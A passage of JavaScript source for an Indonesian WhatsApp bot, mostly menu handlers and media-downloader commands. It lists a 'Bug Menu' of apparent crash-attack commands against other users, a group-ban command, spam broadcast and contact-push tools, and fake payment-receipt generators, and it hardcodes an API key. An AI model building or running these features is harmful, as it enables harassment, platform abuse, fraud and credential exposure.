                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, {
        quoted: qR9X
    });
}
break;
case "groupmenu": {
    let menu = `
┌─「 Group Menu 」
├─ .delete
├─ .leavegc
├─ .leavegc2
├─ .promote
├─ .demote
├─ .kick
├─ .hidetag
├─ .tagall
├─ .upswgc
└─ .bangroup
`;

    await reyz.sendMessage(m.chat, {
        text: menu
    }, {
        quoted: qR9X
    });

    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, {
        quoted: qR9X
    });
}
break;
case "stickermenu": {
    let menu = `
┌─「 Sticker Menu 」
├─ .brat
├─ .bratvid
├─ .bratprabowo
├─ .bratnaruto
├─ .bratanime
├─ .sticker
├─ .smeme
├─ .emojimix
└─ .qc
`;

    await reyz.sendMessage(m.chat, {
        text: menu
    }, {
        quoted: qR9X
    });

    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, {
        quoted: qR9X
    });
}
break;
case "convertmenu": {
    let menu = `
┌─「 Converter Menu 」
├─ .tourl
├─ .toimg
├─ .rvo
├─ .sticker
└─ .smeme
`;

    await reyz.sendMessage(m.chat, {
        text: menu
    }, {
        quoted: qR9X
    });

    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, {
        quoted: qR9X
    });
}
break;
case "randommenu": {
    let menu = `
┌─「 Random Menu 」
├─ .bluearchive
├─ .cosplayba
├─ .cekkhodam
├─ .cekkontol
├─ .cekdevice
├─ .getpp
├─ .pinterest
├─ .iqc
├─ .ttiqc
├─ .remini
├─ .rvo
├─ .waifu
├─ .enc64
├─ .denc64
├─ .cuaca
├─ .detikcom
├─ .meme
├─ .randommeme
├─ .fakedana
├─ .fakeovo
├─ .fakegopay
├─ .fakemovi3
├─ .fakemovi4
├─ .fakenasa
├─ .fakedj
├─ .fakeff
├─ .fakelobbyff
├─ .fakenokia2
├─ .fakewindos
├─ .fakewindos2
├─ .figure
├─ .figure2
├─ .cine
├─ .tohitam
├─ .toghibli
├─ .tocomic
├─ .tochibi
├─ .tosketch
├─ .tomakkah
├─ .tojepang
├─ .hoax
├─ .wasted
├─ .wanted
├─ .iqcgambar
├─ .fakeberita
├─ .fakestoryig
├─ .fakestoryig2
├─ .fakedev
├─ .bratgojo
├─ .bratpatrick
├─ .randompap
├─ .randommemepresiden
├─ .fakeffsquad
├─ .carbon
├─ .playbutton
├─ .cecan
├─ .spotify
└─ .spotifyplay
`;

    await reyz.sendMessage(m.chat, {
        text: menu
    }, {
        quoted: qR9X
    });

    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, {
        quoted: qR9X
    });
}
break;
case "broadcastmenu": {
    let menu = `
┌─「 Broadcast Menu 」
├─ .autojpm
├─ .bcgc
├─ .bljpm
├─ .cekidgc
├─ .jpm
├─ .jpmht
├─ .jpmch
├─ .jpmslide
└─ .listgc
`;

    await reyz.sendMessage(m.chat, { text: menu }, { quoted: qR9X });
    ButMenu(menu);
    await reyz.sendMessage(m.chat, {
        audio: { url: path.join(__dirname, "system/sound/reyz.mp3") },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, { quoted: qR9X });
}
break;

case "pushkontakmenu": {
    let menu = `
┌─「 Push Kontak Menu 」
├─ .pushkontak
├─ .pushkontak2
├─ .pushkontak3
├─ .pushkontakid
├─ .pushkontakid2
├─ .savekontak
└─ .tutor
`;

    await reyz.sendMessage(m.chat, { text: menu }, { quoted: qR9X });
    ButMenu(menu);
    await reyz.sendMessage(m.chat, {
        audio: { url: path.join(__dirname, "system/sound/reyz.mp3") },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, { quoted: qR9X });
}
break;

case "channelmenu": {
    let menu = `
┌─「 Channel Menu 」
└─ .cekidch
`;

    await reyz.sendMessage(m.chat, { text: menu }, { quoted: qR9X });
    ButMenu(menu);
    await reyz.sendMessage(m.chat, {
        audio: { url: path.join(__dirname, "system/sound/reyz.mp3") },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, { quoted: qR9X });
}
break;

case "storemenu": {
    let menu = `
┌─「 Store Menu 」
├─ .dana
├─ .gopay
├─ .ovo
└─ .qris
`;

    await reyz.sendMessage(m.chat, { text: menu }, { quoted: qR9X });
    ButMenu(menu);
    await reyz.sendMessage(m.chat, {
        audio: { url: path.join(__dirname, "system/sound/reyz.mp3") },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, { quoted: qR9X });
}
break;

case "ownermenu": {
    let menu = `
┌─「 Owner Menu 」
├─ .addcase
├─ .addplugin
├─ .ambilq
├─ .anticall
├─ .autoread
├─ .autoreadsw
├─ .autojoingc
├─ .delcase
├─ .delplugin
├─ .getcase
├─ .joingc
├─ .runtime
├─ .setbiobot
├─ .setnamabot
├─ .setppbot
├─ .setting
├─ .self
├─ .public
├─ .addown
├─ .delown
├─ .addprem
├─ .delprem
├─ .listown
└─ .listprem
`;

    await reyz.sendMessage(m.chat, { text: menu }, { quoted: qR9X });
    ButMenu(menu);
    await reyz.sendMessage(m.chat, {
        audio: { url: path.join(__dirname, "system/sound/reyz.mp3") },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, { quoted: qR9X });
}
break;
case "bugmenu": {
    let menu = `
┌─「 Bug Menu 」
├─ .thunder
├─ .flexi
├─ .tensei
├─ .texas 
├─ .flax
├─ .sagata
├─ .bom
├─ .excute
│
└─「 Bug Fast 」
   ├─ .fvck
   └─ .nova
   └─ .santa
   └─ .dark
   └─ .claus
   └─ .damn
   └─ .turbo
   └─ .zero
`;

    await reyz.sendMessage(m.chat, { text: menu }, { quoted: qR9X });
    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, { quoted: qR9X });
}
break;

case "functionmenu": {
    let menu = `
┌─「 Function Menu 」
├─ .testfunc
├─ .checkfunc
├─ .getrawcode
├─ .strukcode
└─ .ambilfunc
`;

    await reyz.sendMessage(m.chat, { text: menu }, { quoted: qR9X });
    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, { quoted: qR9X });
}
break;
case "allmenu": {
    let menu = `
┌─「 R9X-WaBot 」
├ Creator : ReyzTzx
├ Version : v2.0.0
├ User    : ${pushname}
├ Runtime : ${runtime(process.uptime())}
│
└─「 All Menu R9X 」
   ├─ .play
   ├─ .capcut
   ├─ .igdl
   ├─ .mediafire
   ├─ .spotify
   ├─ .ttdl
   ├─ .twitter
   ├─ .delete
   ├─ .leavegc
   ├─ .leavegc2
   ├─ .promote
   ├─ .demote
   ├─ .kick
   ├─ .hidetag
   ├─ .tagall
   ├─ .upswgc
   ├─ .bangroup
   ├─ .brat
   ├─ .bratvid
   ├─ .bratprabowo
   ├─ .bratnaruto
   ├─ .bratanime
   ├─ .sticker
   ├─ .smeme
   ├─ .emojimix
   ├─ .qc
   ├─ .tourl
   ├─ .toimg
   ├─ .rvo
   ├─ .bluearchive
   ├─ .cosplayba
   ├─ .cekkhodam
   ├─ .cekkontol
   ├─ .cekdevice
   ├─ .getpp
   ├─ .pinterest
   ├─ .iqc
   ├─ .ttiqc
   ├─ .remini
   ├─ .waifu
   ├─ .enc64
   ├─ .denc64
   ├─ .cuaca
   ├─ .detikcom
   ├─ .meme
   ├─ .randommeme
   ├─ .fakedana
   ├─ .fakeovo
   ├─ .fakegopay
   ├─ .fakemovi3
   ├─ .fakemovi4
   ├─ .fakenasa
   ├─ .fakedj
   ├─ .fakeff
   ├─ .fakelobbyff
   ├─ .fakenokia2
   ├─ .fakewindos
   ├─ .fakewindos2
   ├─ .figure
   ├─ .figure2
   ├─ .cine
   ├─ .tohitam
   ├─ .toghibli
   ├─ .tocomic
   ├─ .tochibi
   ├─ .tosketch
   ├─ .tomakkah
   ├─ .tojepang
   ├─ .hoax
   ├─ .wasted
   ├─ .wanted
   ├─ .iqcgambar
   ├─ .fakeberita
   ├─ .fakestoryig
   ├─ .fakestoryig2
   ├─ .fakedev
   ├─ .bratgojo
   ├─ .bratpatrick
   ├─ .randompap
   ├─ .randommemepresiden
   ├─ .fakeffsquad
   ├─ .carbon
   ├─ .playbutton
   ├─ .cecan
   ├─ .spotifyplay
   ├─ .autojpm
   ├─ .bcgc
   ├─ .bljpm
   ├─ .cekidgc
   ├─ .jpm
   ├─ .jpmht
   ├─ .jpmch
   ├─ .jpmslide
   ├─ .listgc
   ├─ .pushkontak
   ├─ .pushkontak2
   ├─ .pushkontak3
   ├─ .pushkontakid
   ├─ .pushkontakid2
   ├─ .savekontak
   ├─ .tutor
   ├─ .cekidch
   ├─ .dana
   ├─ .gopay
   ├─ .ovo
   ├─ .qris
   ├─ .addcase
   ├─ .addplugin
   ├─ .ambilq
   ├─ .anticall
   ├─ .autoread
   ├─ .autoreadsw
   ├─ .autojoingc
   ├─ .delcase
   ├─ .delplugin
   ├─ .getcase
   ├─ .joingc
   ├─ .runtime
   ├─ .setbiobot
   ├─ .setnamabot
   ├─ .setppbot
   ├─ .setting
   ├─ .self
   ├─ .public
   ├─ .addown
   ├─ .delown
   ├─ .addprem
   ├─ .delprem
   ├─ .listown
   ├─ .listprem
   ├─ .thunder
   ├─ .flexi
   ├─ .tensei
   ├─ .texas 
   ├─ .flax
   ├─ .sagata
   ├─ .bom
   ├─ .excute
   ├─ .testfunc
   ├─ .checkfunc
   ├─ .getrawcode
   ├─ .strukcode
   └─ .ambilfunc
`;

    await reyz.sendMessage(m.chat, {
        text: menu
    }, {
        quoted: qR9X
    });

    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, {
        quoted: qR9X
    });
}
break;

case "thanksto":
case "tqto": {
    let menu = `
┌─「 R9X-WaBot 」
├ Creator : ReyzTzx
├ Version : v1.0.0
├ User    : ${pushname}
├ Runtime : ${runtime(process.uptime())}
│
└─「 Thanks To 」
   ├─ ReyzTzx
`;

    await reyz.sendMessage(m.chat, {
        text: menu
    }, {
        quoted: qR9X
    });

    ButMenu(menu);

    await reyz.sendMessage(m.chat, {
        audio: {
            url: path.join(__dirname, "system/sound/reyz.mp3")
        },
        mimetype: "audio/mpeg",
        ptt: false,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 2,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400196954767@newsletter",
                serverMessageId: 1,
                newsletterName: "ReyzTzx - Information"
            }
        }
    }, {
        quoted: qR9X
    });
}
break;
//——————————[ Case Fitur Utama ]——————————//
//——————————[ Case Fitur Download ]——————————//
case "play": {
    if (!text) return example(`cinta`);

    if (!text.includes("|")) {
        return await reyz.sendButton(m.chat, {
            text: `🎧 Pilih sumber musik untuk:\n*${text}*`,
            footer: "© ReyzTzx",
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "▶ YouTube",
                        id: `.play yt|${text}`
                    })
                },
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "🎵 Spotify",
                        id: `.play spotify|${text}`
                    })
                },
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "☁ SoundCloud",
                        id: `.play soundcloud|${text}`
                    })
                },
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "🔊 Voice",
                        id: `.play voice|${text}`
                    })
                }
            ]
        }, { quoted: qR9X });
    }

    const [source, ...queryArr] = text.split("|");
    const query = queryArr.join("|").trim();

    if (!query) return reply("❌ Query tidak boleh kosong.");

    await reyz.sendMessage(m.chat, {
        react: {
            text: "☘️",
            key: m.key
        }
    });

    try {
        if (source === "voice") {
            const apiUrl = `https://api-faa.my.id/faa/ytplay?query=${encodeURIComponent(query)}`;
            const { data } = await axios.get(apiUrl);

            if (!data.status || !data.result?.mp3) {
                return reply("❌ Audio tidak ditemukan.");
            }

            const audioResponse = await axios.get(data.result.mp3, {
                responseType: "arraybuffer"
            });

            await reyz.sendMessage(m.chat, {
                audio: Buffer.from(audioResponse.data),
                mimetype: "audio/mpeg",
                ptt: false,
                fileName: `${data.result.title || query}.mp3`
            }, {
                quoted: qR9X
            });

            return;
        }

        const url = `https://api.lumi-base.my.id/canvas/brat?text=${encodeURIComponent(query)}&isvideo=true`;

        const response = await axios.get(url, {
            responseType: "arraybuffer"
        });

        await reyz.sendMessage(m.chat, {
            video: Buffer.from(response.data),
            mimetype: "video/mp4",
            caption: `🎵 *PLAY MUSIC*\n\n📌 Teks : ${query}\n🎧 Source : ${source}`
        }, {
            quoted: qR9X
        });

    } catch (err) {
        console.error("play cmd error:", err);
        reply("❌ Gagal mengambil media.");
    }
}
break;
case "capcut": {
    if (!text) return example(`https://www.capcut.com/tv2/ZSSCR6UFU/`);
    if (!/^https?:\/\/(www\.)?capcut\.com\//i.test(text)) {
        return reply("❌ URL CapCut tidak valid.");
    }

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        const apiUrl = `https://api.siputzx.my.id/api/d/capcutv2?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (!data.status || !data.data || !data.data.medias.length) {
            return reply("❌ Gagal mengambil media dari CapCut.");
        }

        const { title, thumbnail, medias } = data.data;

        // Pilih kualitas HD No Watermark kalau ada
        let media = medias.find(m => /HD No Watermark/i.test(m.quality)) || medias[0];

        await reyz.sendMessage(
            m.chat,
            {
                video: { url: media.url },
                caption: `✅ *CapCut Template*\n\n🎬 Judul: ${title}\n💾 Kualitas: ${media.quality}\n📦 Size: ${media.formattedSize}`
            },
            { quoted: qR9X }
        );

    } catch (err) {
        console.error(err);
        reply(`❌ Error: ${err.message}`);
    }
}
break
case "igdl": {
    if (!text) return example(`https://www.instagram.com/reel/DMNiqN2TV3v/`);

    if (!/^https?:\/\/(www\.)?instagram\.com\/(p|reel|tv)\//i.test(text)) {
        return reply("❌ URL Instagram tidak valid.");
    }

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        const apiUrl = `https://api-faa.my.id/faa/igdl?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (!data.status || !data.result || !data.result.url || !data.result.url.length) {
            return reply("❌ Gagal mengambil media dari Instagram.");
        }

        const { url: medias, metadata } = data.result;

        for (let mediaUrl of medias) {
            if (metadata.isVideo || mediaUrl.includes(".mp4")) {
                // kirim video
                await reyz.sendMessage(
                    m.chat,
                    {
                        video: { url: mediaUrl },
                        caption: `✅ Instagram Video berhasil didownload.\n\n👤 ${metadata.username}\n❤️ ${metadata.like}\n💬 ${metadata.comment}`
                    },
                    { quoted: qR9X }
                );
            } else {
                // kirim foto
                await reyz.sendMessage(
                    m.chat,
                    {
                        image: { url: mediaUrl },
                        caption: `✅ Instagram Photo berhasil didownload.\n\n👤 ${metadata.username}\n❤️ ${metadata.like}\n💬 ${metadata.comment}`
                    },
                    { quoted: qR9X }
                );
            }

            await sleep(1500);
        }

    } catch (err) {
        console.error(err);
        reply(`❌ Error: ${err.message}`);
    }
}
break
case "mediafire": {
  if (!text) return example(`https://www.mediafire.com/file/iojnikfucf67q74/Base_Bot_Simpel.zip/file`);
  if (!/^https?:\/\/(www\.)?mediafire\.com\/.+/i.test(text)) {
    return reply("❌ URL MediaFire tidak valid.");
  }

  await reyz.sendMessage(m.chat, { react: { text: "📥", key: m.key } });

  try {
    const apiUrl = `https://api-faa.my.id/faa/mediafire?url=${encodeURIComponent(text)}`;
    const { data } = await axios.get(apiUrl);

    if (!data.status || !data.result) {
      return reply("❌ Gagal mengambil file dari MediaFire.");
    }

    const file = data.result;

    let cap = `📥 *MediaFire Downloader*\n\n`;
    cap += `📌 Nama File: *${file.filename}*\n`;
    cap += `📦 Ukuran: *${file.size}*\n`;
    cap += `📂 Tipe: ${file.mime}\n\n`;
    cap += `⏬ File sedang dikirim...`;

    await reyz.sendMessage(m.chat, {
      document: { url: file.download_url },
      fileName: file.filename,
      mimetype: "application/zip",
      caption: cap
    }, { quoted: qR9X });

  } catch (err) {
    console.error("mediafire cmd error:", err);
    reply("❌ Terjadi kesalahan saat download file MediaFire.");
  }
}
break
case "spotify": {
    if (!text) return example(`https://open.spotify.com/track/4iV5W9uYEdYUVa79Axb7Rh`);
    if (!/^https?:\/\/(open|play)\.spotify\.com\/.+/i.test(text)) {
        return reply("❌ URL Spotify tidak valid.");
    }

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        const apiUrl = `https://api-nanzz.my.id/docs/api/downloader/spotify-dl.php?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (!data || (data.status === false)) return reply("❌ Gagal mengambil lagu dari Spotify.");

        const track = data.result || data.data || data;
        const audioUrl = track.download_url || track.downloadUrl || track.mp3DownloadLink || track.url;
        const title = track.title || track.songTitle || track.name || "Spotify Track";
        const artist = track.artist || track.author || "-";
        const cover = track.image || track.cover || track.coverImage || track.thumbnail;

        if (!audioUrl) return reply("❌ Link audio tidak ditemukan pada respons API.");

        await reyz.sendMessage(
            m.chat,
            {
                audio: { url: audioUrl },
                mimetype: "audio/mpeg",
                fileName: `${title}.mp3`,
                ptt: false,
                contextInfo: cover ? {
                    externalAdReply: {
                        title,
                        body: artist,
                        mediaType: 2,
                        thumbnailUrl: cover,
                        sourceUrl: text
                    }
                } : undefined
            },
            { quoted: qR9X }
        );

        reply(`🎶 *Spotify Downloader*\n\n🎵 Judul: *${title}*\n👤 Artis: *${artist}*\n✅ Lagu berhasil didownload!`);

    } catch (err) {
        console.error(err);
        reply(`❌ Error: ${err.message}`);
    }
}
break

case "spotifyplay": {
    if (!text) return example(`https://open.spotify.com/track/4iV5W9uYEdYUVa79Axb7Rh`);

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        const apiUrl = `https://api-nanzz.my.id/docs/api/downloader/spotiplay.php?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (!data || (data.status === false)) return reply("❌ Gagal mengambil lagu dari Spotify.");

        const track = data.result || data.data || data;
        const audioUrl = track.download_url || track.downloadUrl || track.mp3DownloadLink || track.url;
        const title = track.title || track.songTitle || track.name || "Spotify Track";

        if (!audioUrl) return reply("❌ Link audio tidak ditemukan pada respons API.");

        await reyz.sendMessage(
            m.chat,
            { audio: { url: audioUrl }, mimetype: "audio/mpeg", fileName: `${title}.mp3`, ptt: false },
            { quoted: qR9X }
        );
    } catch (err) {
        console.error(err);
        reply(`❌ Error: ${err.message}`);
    }
}
break
case "ttdl":
case "tt":
case "tiktok": {
    if (!text) return example(`https://vt.tiktok.com/ZSBhtXeVr/`);
    if (!/^https?:\/\/(www\.)?(tiktok\.com|vt\.tiktok\.com|vm\.tiktok\.com|m\.tiktok\.com)\/.+/i.test(text)) {
        return reply("❌ URL TikTok tidak valid.");
    }

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        const { data } = await axios.get("https://tiktok-scraper7.p.rapidapi.com", {
            headers: {
                "Accept-Encoding": "gzip",
                "Connection": "Keep-Alive",
                "Host": "tiktok-scraper7.p.rapidapi.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
                "X-RapidAPI-Host": "tiktok-scraper7.p.rapidapi.com",
                "X-RapidAPI-Key": "ca5c6d6fa3mshfcd2b0a0feac6b7p140e57jsn72684628152a" // ganti pake keymu
            },
            params: { url: text, hd: "1" }
        });

        const res = data.data;
        if (!res || !res.hdplay) return reply("❌ Gagal mengambil data video TikTok.");

        let cap = `✅ *Tiktok Downloader*\n\n`;
        cap += `🎥 Judul: ${res.title || "-"}\n`;
        cap += `👤 Author: ${res.author?.nickname || "-"} (@${res.author?.unique_id || "-"})\n`;
        cap += `🌎 Region: ${res.region}\n`;
        cap += `▶️ Play Count: ${res.play_count}\n❤️ Likes: ${res.digg_count}\n💬 Comments: ${res.comment_count}\n🔄 Share: ${res.share_count}`;

        await reyz.sendMessage(
            m.chat,
            {
                video: { url: res.hdplay },
                caption: cap
            },
            { quoted: qR9X }
        );

    } catch (err) {
        console.error(err);
        reply(`❌ Error: ${err.message}`);
    }
}
break
case "twitter":
case "twitdl": {
    if (!text) return example(`https://twitter.com/9GAG/status/1661175429859012608`);
    if (!/^https?:\/\/(www\.)?(twitter|x)\.com\//i.test(text)) {
        return reply("❌ URL Twitter/X tidak valid.");
    }

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        const apiUrl = `https://api.siputzx.my.id/api/d/twitter?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (!data.status || !data.data || !data.data.downloadLink) {
            return reply("❌ Gagal mengambil media dari Twitter.");
        }

        const { downloadLink, imgUrl, videoTitle, videoDescription } = data.data;

        await reyz.sendMessage(
            m.chat,
            {
                video: { url: downloadLink },
                caption: `✅ *Twitter Video Downloaded*\n\n🎬 Title: ${videoTitle || "-"}\n📝 Desc: ${videoDescription || "-"}`
            },
            { quoted: qR9X }
        );

    } catch (err) {
        console.error(err);
        reply(`❌ Error: ${err.message}`);
    }
}
break

//——————————[ Case Fitur Group ]——————————//

case "joingc": case "join": {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (!text && !m.quoted) return example('linknya')
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await reyz.groupAcceptInvite(result).then(respon => reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => reply(error.toString()))
}
break
case "leave": case "leavegc": {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (!isGroup) return reply("Pakai Fitur Ini Di Group.")
await reply("Otw Bosss")
await sleep(3000)
await reyz.groupLeave(m.chat)
}
break

case "leavegc2": case "leave2": {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    
    let gcall = Object.values(await reyz.groupFetchAllParticipating().catch(_ => null));
    let num = [];
    let listgc = `*Contoh Cara Penggunaan :*\nKetik *${prefix+command}* <Nomor Grup / all / tertutup>\n\n`;

    gcall.forEach((u, i) => {
        num.push(i);
        listgc += `*${i+1}.* ${u.subject}
* ID:* ${u.id}
* Total Member:* ${u.participants.length} Member
* Status Grup:* ${u.announce == true ? "Tertutup" : "Terbuka"}
* Pembuat:* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`;
    });

    // Kalau tidak ada argumen, kirim daftar grup
    if (!args[0]) {
        return reyz.sendMessage(
            m.chat,
            {
                text: listgc,
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        thumbnail: await getBuffer(await getPpUser()),
                        title: `[ ${gcall.length} Group Chat ] `,
                        body: `Runtime : ${runtime(process.uptime())}`,
                        sourceUrl: '',
                        previewType: "PHOTO"
                    }
                }
            },
            { quoted: qR9X }
        );
    }

    // Opsi keluar semua grup
    if (args[0].toLowerCase() === "all") {
        for (let gc of gcall) {
            await reyz.groupLeave(gc.id);
        }
        return reply(`Berhasil keluar dari semua grup ✅`);
    }

    // Opsi keluar grup tertutup & bot bukan admin
    if (args[0].toLowerCase() === "tertutup") {
        let leftCount = 0;
        for (let gc of gcall) {
            if (gc.announce && !gc.participants.find(p => p.id === reyz.user.id && p.admin)) {
                await reyz.groupLeave(gc.id);
                leftCount++;
            }
        }
        return reply(`Berhasil keluar dari ${leftCount} grup tertutup di mana bot bukan admin ✅`);
    }

    // Opsi keluar berdasarkan nomor
    if (!num.includes(Number(args[0]) - 1)) return reply("Grup tidak ditemukan");
    let leav = Number(args[0]) - 1;
    await reply(`Berhasil keluar dari grup:\n*${gcall[leav].subject}*`);
    await reyz.groupLeave(gcall[leav].id);
}
break
case "upswgc":
case "swgc":
case "swgrup": {
  if (!m.isGroup) return reply("Pakai Fitur Ini Di Group.");
  if (!isAdmins) return reply("Bot Bukan Admin Group.");
  if (!isBotAdmins) return reply("Bot Belum Menjadi Admin Group.");

  const qmsg = m.quoted ? m.quoted : m;
  const mime = (qmsg.msg || qmsg).mimetype || "";
  const caption = text.replace(new RegExp(`^${prefix + command}\\s*`, "i"), "").trim();

  try {
    if (!mime && !caption) {
      return example(`Halo semua (opsional reply media)`);
    }
    async function groupStatus(reyz, jid, content) {
      const { backgroundColor } = content;
      delete content.backgroundColor;

      const inside = await generateWAMessageContent(content, {
        upload: reyz.waUploadToServer,
        backgroundColor
      });

      const messageSecret = crypto.randomBytes(32);

      const msg = generateWAMessageFromContent(
        jid,
        {
          messageContextInfo: { messageSecret },
          groupStatusMessageV2: {
            message: {
              ...inside,
              messageContextInfo: { messageSecret }
            }
          }
        },
        {}
      );

      await reyz.relayMessage(jid, msg.message, {
        messageId: msg.key.id
      });

      return msg;
    }

    let payload = {};

    if (/image/.test(mime)) {
      const buffer = await qmsg.download();
      payload = {
        image: buffer,
        caption
      };
    } 
    else if (/video/.test(mime)) {
      const buffer = await qmsg.download();
      payload = {
        video: buffer,
        caption
      };
    } 
    else if (/audio/.test(mime)) {
      const buffer = await qmsg.download();
      payload = {
        audio: buffer,
        mimetype: "audio/mp4"
      };
    } 
    else if (caption) {
      payload = {
        text: caption
      };
    }

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    await groupStatus(reyz, m.chat, payload);

    reply("✅ Status grup berhasil diposting.");

  } catch (err) {
    console.error("upswgc error:", err);
    reply("❌ Gagal upload status grup.", err);
  }
}
break
case "bangroup": {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!m.isGroup) {
        return reply("Pakai Fitur Ini Di Group.");
    }
    try {
        await addmeta(m.chat);
        reply("✅ Group Otw Ke Ban");
    } catch (err) {
        reply(`❌ Gagal\n${err.message}`);
    }
}
break

//——————————[ Case Fitur Sticker ]——————————//
case "brat": {
  if (!text) return example("teksnya");
  try {
    await reyz.sendMessage(m.chat, {
      react: { text: "☘️", key: m.key }
    });

    const url = `https://api.lumi-base.my.id/canvas/brat?text=${encodeURIComponent(text)}`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    await reyz.sendImageAsSticker(
      m.chat,
      response.data,
      m,
      {
        packname: `By: ReyzTzx
Buy Bot? Chat Telegram : t.me/reyztzx`,
        author: `ReyzTzx`
      }
    );

  } catch (err) {
    console.error("Error:", err);
    await reyz.sendMessage(m.chat, {
